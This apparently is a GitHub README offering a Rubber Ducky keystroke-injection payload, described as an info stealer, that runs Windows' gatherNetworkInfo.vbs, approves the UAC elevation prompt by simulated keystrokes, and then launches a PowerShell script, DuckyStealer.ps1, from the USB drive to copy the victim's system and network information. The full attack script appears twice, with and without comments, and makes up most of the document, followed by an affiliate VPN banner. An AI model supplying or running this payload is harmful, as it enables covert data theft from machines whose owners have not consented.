# Rubber_Ducky_Gather_Network_Info
A very quickly script for rubber ducky which exploits the gatherNetworkInfo.vbs file in the</BR>
C:\Windows\System32 folder to steal different information from the victim machine.

![Alt text](https://github.com/JonnyBanana/Rubber_Ducky_Gather_Network_Info/blob/master/images/PrivacyPolicy.png "Rubber_Ducky_Gather_Network_Info by JonnyBanana")

<h2>Gather_Network_Info_Script</h2>

REM gathernetworkInfo a info stealer script by JonnyBanana
</BR>
REM https://github.com/JonnyBanana
</BR>
REM large delay beacause Windows require a lot of time to read the Ducky with twin duck firmware
</BR>
DELAY 10000
</BR>
GUI R
</BR>
DELAY 200
</BR>
STRING cmd  /C "start gatherNetworkInfo.vbs"  
DELAY 200
</BR>
REM run as admin
</BR>
CTRL-ALT ENTER
</BR>
DELAY 100
</BR>
LEFTARROW
</BR>
DELAY 100
</BR>
ENTER
</BR>
REM the scripts require a little of time to create the files....
</BR>
DELAY 15000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
STRING powershell
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
REM the Rubber Ducky MUST renamed on " _ " (bottom bar)
</BR>
STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
</BR>
DELAY 200
</BR>
ENTER
</BR>
REM the last command  takes about thirty seconds to copy all the informations
</BR>
REM so be patient...



<h6>Script Without Comments</H6>

DELAY 10000
</BR>
GUI R
</BR>
DELAY 200
</BR>
STRING cmd  /C "start gatherNetworkInfo.vbs"  
DELAY 200
</BR>
CTRL-ALT ENTER
</BR>
DELAY 100
</BR>
LEFTARROW
</BR>
DELAY 100
</BR>
ENTER
</BR>
DELAY 15000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
STRING powershell
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
</BR>
DELAY 200
</BR>
ENTER
</BR>




<h3>Quack Yo Life!!!</h3>
</BR>




</BR>
<!-- Banner -->
<div align="center">
<a href="https://www.purevpn.com/order-now.php?aff=44922&amp;a_bid=bbd0f893" target="_blank" ><img src="https://affiliates.purevpn.com/accounts/default1/6hb82wqa2l/bbd0f893.jpg" alt="Best VPN" title="Best VPN" width="728" height="90" /></a>
</BR></BR>
</div>


More info: https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/

